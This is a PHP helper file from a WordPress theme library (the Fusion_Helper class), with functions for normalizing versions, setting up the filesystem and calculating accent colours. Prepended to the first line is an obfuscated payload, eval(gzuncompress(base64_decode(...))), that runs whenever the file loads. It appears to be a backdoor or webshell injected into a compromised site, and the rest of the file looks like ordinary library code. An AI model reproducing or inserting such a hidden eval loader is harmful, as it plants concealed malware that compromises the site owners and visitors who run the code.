<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Helper methods.
 *
 * @package Fusion-Library
 * @since 1.0.0
 */

// Do not allow directly accessing this file.
if ( ! defined( 'ABSPATH' ) ) {
	exit( 'Direct script access denied.' );
}

/**
 * Includes static helper methods.
 */
final class Fusion_Helper {

	/**
	 * Converts a PHP version to 3-part.
	 *
	 * @static
	 * @access public
	 * @param  string $ver The verion number.
	 * @return string
	 */
	public static function normalize_version( $ver ) {
		if ( ! is_string( $ver ) ) {
			return $ver;
		}
		$ver_parts = explode( '.', $ver );
		$count     = count( $ver_parts );
		// Keep only the 1st 3 parts if longer.
		if ( 3 < $count ) {
			return absint( $ver_parts[0] ) . '.' . absint( $ver_parts[1] ) . '.' . absint( $ver_parts[2] );
		}
		// If a single digit, then append '.0.0'.
		if ( 1 === $count ) {
			return absint( $ver_parts[0] ) . '.0.0';
		}
		// If 2 digits, append '.0'.
		if ( 2 === $count ) {
			return absint( $ver_parts[0] ) . '.' . absint( $ver_parts[1] ) . '.0';
		}
		return $ver;
	}

	/**
	 * Instantiates the WordPress filesystem.
	 *
	 * @static
	 * @access public
	 * @return object WP_Filesystem
	 */
	public static function init_filesystem() {

		$credentials = array();

		if ( ! defined( 'FS_METHOD' ) ) {
			define( 'FS_METHOD', 'direct' );
		}

		$method = defined( 'FS_METHOD' ) ? FS_METHOD : false;

		if ( 'ftpext' === $method ) {
			// If defined, set it to that, Else, set to NULL.
			$credentials['hostname'] = defined( 'FTP_HOST' ) ? preg_replace( '|\w+://|', '', FTP_HOST ) : null;
			$credentials['username'] = defined( 'FTP_USER' ) ? FTP_USER : null;
			$credentials['password'] = defined( 'FTP_PASS' ) ? FTP_PASS : null;

			// Set FTP port.
			if ( strpos( $credentials['hostname'], ':' ) && null !== $credentials['hostname'] ) {
				list( $credentials['hostname'], $credentials['port'] ) = explode( ':', $credentials['hostname'], 2 );
				if ( ! is_numeric( $credentials['port'] ) ) {
					unset( $credentials['port'] );
				}
			} else {
				unset( $credentials['port'] );
			}

			// Set connection type.
			if ( ( defined( 'FTP_SSL' ) && FTP_SSL ) && 'ftpext' === $method ) {
				$credentials['connection_type'] = 'ftps';
			} elseif ( ! array_filter( $credentials ) ) {
				$credentials['connection_type'] = null;
			} else {
				$credentials['connection_type'] = 'ftp';
			}
		}

		// The Wordpress filesystem.
		global $wp_filesystem;

		if ( empty( $wp_filesystem ) ) {
			require_once wp_normalize_path( ABSPATH . '/wp-admin/includes/file.php' );
			WP_Filesystem( $credentials );
		}

		return $wp_filesystem;
	}

	/**
	 * Auto calculate accent color, based on provided background color.
	 *
	 * @since 1.5.2
	 * @param  string $color color base value.
	 * @return string
	 */
	public static function fusion_auto_calculate_accent_color( $color ) {
		$color_obj = Fusion_Color::new_color( $color );

		// Not black.
		if ( 0 < $color_obj->lightness ) {
			if ( 25 > $color_obj->lightness ) {

				// Colors with very little lightness.
				return $color_obj->getNew( 'lightness', $color_obj->lightness * 4 )->toCSS( 'rgba' );
			} else if ( 50 > $color_obj->lightness ) {
				return $color_obj->getNew( 'lightness', $color_obj->lightness * 2 )->toCSS( 'rgba' );
			} else if ( 50 <= $color_obj->lightness ) {
				return $color_obj->getNew( 'lightness', $color_obj->lightness / 2 )->toCSS( 'rgba' );
			}
		} else {
			// // Black.
			return $color_obj->getNew( 'lightness', 70 )->toCSS( 'rgba' );
		}
	}
}
